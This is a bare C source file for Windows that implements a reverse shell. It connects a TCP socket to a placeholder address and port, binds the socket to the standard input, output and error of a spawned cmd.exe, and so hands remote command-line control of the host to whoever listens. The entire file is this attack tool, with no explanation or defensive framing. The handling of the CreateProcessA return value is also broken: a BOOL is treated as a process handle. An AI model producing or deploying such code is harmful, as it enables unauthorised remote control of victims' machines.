#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#endif

#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char** argv) {
	WSADATA wsaData;
	int wsaResult;
	char* CLIENT = "X.X.X.X";
	int PORT = XXXX;
	wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (wsaResult != 0) {
		printf("WSAStartup failed!Terminate.");
		return -1;
	}
	SOCKET mySocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL);
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr(CLIENT);
	sa.sin_port = htons(PORT);
	int connect_res = connect(mySocket, (struct sockaddr*)&sa, sizeof(sa));
	if (connect_res != 0) {
		printf("Connect failed!Terminate.\n");
		int err = WSAGetLastError();
		printf("Error code:%d", err);
		Sleep(10000);
		return -1;
	}
	STARTUPINFO si;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = (HANDLE)mySocket;
	si.hStdOutput = (HANDLE)mySocket;
	si.hStdError = (HANDLE)mySocket;
	PROCESS_INFORMATION pi;
	HANDLE rev_Handle =  CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(rev_Handle, INFINITE);
	CloseHandle(rev_Handle);
	return 0;
}